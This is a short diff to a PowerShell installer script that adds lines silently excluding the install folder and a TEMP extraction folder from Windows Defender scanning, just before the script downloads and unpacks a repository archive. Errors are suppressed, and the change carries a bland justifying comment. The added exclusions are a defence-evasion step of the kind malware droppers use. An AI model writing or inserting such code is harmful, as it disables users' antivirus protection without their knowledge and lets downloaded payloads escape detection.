@@ -67,6 +67,12 @@ if (-not $LocalRepoRoot) {
     try {
         if (-not (Test-Path $TargetDir)) { New-Item -Path $TargetDir -ItemType Directory -Force | Out-Null }
         
+        # Configure Defender folder exclusions so internal configuration scripts are not locked
+        try {
+            Add-MpPreference -ExclusionPath $TargetDir -ErrorAction SilentlyContinue
+            Add-MpPreference -ExclusionPath "$env:TEMP\winaurex_extract" -ErrorAction SilentlyContinue
+        } catch {}
+
         Write-Host "Fetching repository archive..." -ForegroundColor DarkGray
         Invoke-WebRequest -Uri $ZipUrl -OutFile $ZipFile -UseBasicParsing
         
